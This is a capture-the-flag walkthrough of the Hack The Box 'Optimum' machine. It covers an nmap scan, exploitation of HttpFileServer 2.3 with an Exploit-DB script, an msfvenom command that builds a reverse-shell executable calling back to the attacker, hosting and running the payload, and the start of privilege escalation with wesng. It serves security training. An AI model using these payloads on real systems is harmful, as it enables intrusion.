# Box: Optimum
# Level: Easy
# OS: Windows
<hr>

Lets get started

# Recon

## Portscanning

command:```sudo nmap -A -T4 -v -p- 10.129.111.57```

```
Nmap scan report for 10.129.111.57
Host is up (0.20s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
|_http-server-header: HFS 2.3
|_http-title: HFS /
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2012 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 7 Professional (87%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.015 days (since Sun Sep 17 16:46:43 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   197.31 ms 10.10.14.1
2   197.47 ms 10.129.111.57

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep 17 17:07:49 2023 -- 1 IP address (1 host up) scanned in 778.27 seconds
```
From the above scan, we have only 1 open port and that's the port that runs the http service. This means our enumeration today will be focused on port 80



# Enumeration

Navigate to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cf65020f-9ec8-4168-8321-c1fbb958b182)

This webpage is being hosted by ```HttpFileServer```. 

I think there's an exploit for this version of ```HttpFileServer```, well lets check

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5fe5acce-0ed1-4c83-91a3-eed36f756e5f)

Well there is😅. Lets exploit right away



# Exploitation

Well, I found this great exploit, you can download it [here](https://www.exploit-db.com/exploits/39161)



So, we'll set the ```LHOST``` to our tun0 ip, we'll also set the ```LPORT``` to the port we plan on listening on

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/de36cb6b-4ff8-4fc4-a752-ca27abd72924)

Save the script.

As per the instruction in the script, we were told to host a ```nc.exe``` file, well I generated the ```.exe``` file using msfvenom

command:```msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.43 LPORT=443 -f exe -o nc.exe```

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/optimum]                                                                                                                                             
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.43 LPORT=443 -f exe -o nc.exe                                                                                                          
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: nc.exe
```
Ensure you have your netcat listener ready before running the script

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/35697632-7b3e-4ef6-a9f3-c6e3b673af51)

Running the script requires the target's ip and port

command:```python2 39161.py 10.129.58.117 80```

Alongside running this script, we'll host the ```nc.exe``` file

command:```python3 -m http.server 80```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5b672fd6-0647-4542-85b7-ea610ab8a276)

Checking our netcat listener,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3f9625a2-cadc-4c0d-aa9f-c5b27dddfd01)

We didn't spawn a shell🥲, running the script again

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0b69eaaf-5c0c-43dd-a51f-967ee0e70029)

Checking our netcat listener,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ae181f7e-1f08-435b-be9d-878565aa2d11)

We got a user shell🙂. Lets go ahead and escalate our privileges.



# Privilege Escalation

Lets run the  windows exploit suggester, you can get it [here](https://github.com/bitsadmin/wesng)

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4262d643-84bb-41aa-a462-f30ab610a048)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/715e4a57-6fb2-494f-b118-b4b68849886d)

First lets update the database,

command:```python3 wes.py --update```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/66d7d16f-b1f9-432d-a0f0-a6b7f4d49730)

Done.

Lets go back to the shell we got earlier and run the ```systeminfo``` command, save the output in a file say ```systeminfo.txt```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c735b9d0-4fbf-42bb-9a4b-f888eac61e3f)

Now, to run the script

command:```python3 wes.py path/to/systeminfo.txt -e```





















